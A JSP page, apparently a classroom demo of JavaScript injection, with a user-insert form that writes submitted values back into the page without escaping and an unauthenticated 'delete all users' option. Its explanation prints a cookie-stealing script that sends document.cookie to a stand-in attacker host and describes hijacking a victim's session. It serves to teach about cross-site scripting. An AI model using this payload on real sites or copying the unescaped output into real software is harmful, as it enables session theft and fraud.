<%@page contentType="text/html" pageEncoding="UTF-8"%> 
<%@page language="java" import="dbUtils.DbConn" %>
<%@page language="java" import="java.sql.*"%>

<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <title>JavaScript Injection Demo</title>
        <style>
            body {
                background-color: khaki; font-family:arial;
            }
            .codeExplain {
                margin:12px;
                margin-bottom:0px;
                padding:12px;
                width:60em;
            }
            .codeDiv {
                background-color: beige;
                margin:12px;
                padding:12px;
                border:2px solid maroon;
                width:55em;
            }
            li {
                line-height:1.25em;
            }
            .error {
                color:red; font-weight: bold;
            }
        </style>
    </head>
    <body>

        <%
            String strUserEmail = "";
            String strUserPw = "";
            String strUserInfo = "";
            String strUserRole = "1";  // so we do not break FK contraint on insert

            String strUserEmailMsg = "";
            String strUserPwMsg = "";
            String strUserInfoMsg = "";
            String strUserRoleMsg = "";

            String strDeleteAll = "";

            String formMsg = ""; // e.g., record inserted or please edit and retry.X

            if (request.getParameter("userEmail") != null) { // postback, not 1st display
                DbConn dbc = new DbConn();
                formMsg = dbc.getErr();
                if (formMsg.length() == 0) { // DB connection is good

                    // extract user values from URL
                    strUserEmail = request.getParameter("userEmail");
                    strUserPw = request.getParameter("userPw");
                    strUserInfo = request.getParameter("userInfo");
                    strUserRole = request.getParameter("userRole");

                    strDeleteAll = request.getParameter("isDeleteAll");

                    if (strDeleteAll != null && strDeleteAll.equalsIgnoreCase("on")) {
                        formMsg = "delete all... ";

                        try { // try to delete
                            String sql = "DELETE FROM pay WHERE 1=1";
                            PreparedStatement ps = dbc.getConn().prepareStatement(sql);
                            int numRows = ps.executeUpdate();
                            formMsg += (new Integer(numRows).toString() + " PAY records were deleted. ");
                            ps.close();
                            sql = "DELETE FROM web_user WHERE 1=1";
                            ps = dbc.getConn().prepareStatement(sql);
                            numRows = ps.executeUpdate();
                            formMsg += (new Integer(numRows).toString() + " USER records were deleted. ");

                        } catch (Exception e) {
                            formMsg += "Problem with delete. " + e.getMessage();
                        }
                    } // end of check for deleteAll 
                    // next check for validation
                    else if (strUserEmail.length() == 0) { // didnt pass validation
                        // for this simple insert, we're only making sure they entered a value into user email.
                        strUserEmailMsg = "User Email is required";
                        formMsg += "Please try again.";
                    } else {  // "passed validation" - so try to insert.

                        String sql = "INSERT INTO web_user (user_email, user_password, user_info, user_role_id) "
                                + "  VALUES (?,?,?,?)";  // no insert into the web_user_id (auto-increment field)

                        try { // try to insert
                            PreparedStatement ps = dbc.getConn().prepareStatement(sql);
                            ps.setString(1, strUserEmail);
                            ps.setString(2, strUserPw);
                            ps.setString(3, strUserInfo);
                            ps.setString(4, strUserRole);

                            int numRows = ps.executeUpdate();
                            if (numRows == 1) {
                                formMsg = (strUserEmail + " Inserted.");
                            } else { // inserted 0 recs or > 1 recs
                                formMsg = (new Integer(numRows).toString() + " records were inserted (unexpected).");
                            }
                        } // try to insert
                        catch (SQLException e) {
                            if (e.getSQLState().equalsIgnoreCase("S1000")) {
                                formMsg = "Can't add - record with that ID exists (should not happen since web_user has auto-increment primary key).";
                            } else {
                                formMsg = "Problem with SQL in WebUserSql.insert(): " + "SQLState:" + e.getSQLState() + ", Error message: " + e.getMessage();
                            }
                        } // catch special sql exception
                        catch (Exception e) { // any exception (while trying to insert)
                            formMsg = "General Error in WebUserSql.insert(): " + e.getMessage();
                        } // catch any exception (while trying to insert)
                    } // passed validation (insert code)
                } // Db Connection good
                dbc.close(); // close database connection
            } // postback 
%>

        <jsp:include page="links.jsp" />

        <h1>Add User</h1>
        <form name="myForm" action="js_injection.jsp" method="GET">
            <table style="padding:5px;">
                <tr>
                    <td>User Email</td>
                    <td><input type="text" name="userEmail" value="<%=strUserEmail%>" ></td>
                    <td class="error"><%=strUserEmailMsg%></td>
                </tr>
                <tr>
                    <td>Password</td>
                    <td><input type="text" name="userPw" value="<%=strUserPw%>" ></td>
                    <td class="error"><%=strUserPwMsg%></td>
                </tr>
                <tr>
                    <td>User Info</td>
                    <td><textarea name="userInfo" rows="10" cols="140"><%=strUserInfo%></textarea></td>
                    <td class="error"><%=strUserInfoMsg%></td>
                </tr>
                <tr>
                    <td>Role</td>
                    <td><input type="text" name="userRole" value="<%=strUserRole%>" ></td>
                    <td class="error"><%=strUserRoleMsg%></td>
                </tr>
                <tr>
                    <td>&nbsp;</td>
                    <td></td>
                    <td></td>
                </tr>
                <tr>
                    <td> <input type="submit" value="Submit" ></td>
                    <td style="text-align: left;">Delete All Users? <input type="checkbox" name="isDeleteAll"> </td>
                    <td></td>
                </tr>
            </table>

            <br/>
            <span class="error"><%=formMsg%></span>

        </form>
        <br/>

        <div class="codeExplain">
            <strong>The hacker can enter this javaScript code into the above text area:</strong>
            <div class="codeDiv">
                Love the product (making the data look "normal" to the person viewing the page).
                <br/>
                <br/>&lt;script&gt;<br/>
                &nbsp;&nbsp;&nbsp;var newUrl = "http://attackerSite.com/getCookie.JSP?cookieVals=" + document.cookie; // Real Hacker Site<br/>
                <br/>
                &nbsp;&nbsp;&nbsp;// Pretend Sally is Hacker<br/>
                &nbsp;&nbsp;&nbsp;newUrl = "http://cis-linux2.temple.edu/~sallyk/home/index.php?cookieVals="+document.cookie;<br/>
                <br/>
                &nbsp;&nbsp;&nbsp;// Real hacker would not show the victim that their cookies are about to be stolen.<br/>          
                &nbsp;&nbsp;&nbsp;alert ("newUrl will be " + newUrl + ". Click here to have your cookies stolen, redirecting to hacker's site."); <br/>
                <br/>
                &nbsp;&nbsp;&nbsp;document.location=newUrl;<br/>
                &lt;/script&gt;<br/>
            </div>

            <h4>How the hack works</h4>
            <ol>
                <li>
                    The hacker inserts a record that has embedded javaScript in it (like the above example) into  
                    the database of a "facebook-like" site that does not "clean" user input (a bad practice). 
                    It is willing to store javaScript into its database. 
                </li> 
                <li>
                    A victim is (or was recently) logged into an "amazon-like" site that uses cookies to remember 
                    if a user is logged in (this, of course, is also a bad practice). 
                </li> 
                <li>
                    The victim views the hacker's record (from the "facebook-like" site) and, in doing so, runs the 
                    hacker's javaScript code that redirects to a hacker page that extracts/stores the victim's cookie 
                    data then redirects immediately to a page on the "facebook-like" site - so that the victim does not 
                    even know they have been hacked. 
                </li> 
                <li>
                    The hacker logs on to the amazon-like site as the victim (using the amazon-like site's jsessionid 
                    that was just stolen) and then makes purchases using the victim's stored credit card information. 
                </li> 
            </ol>

        </div>
    </body>
</html>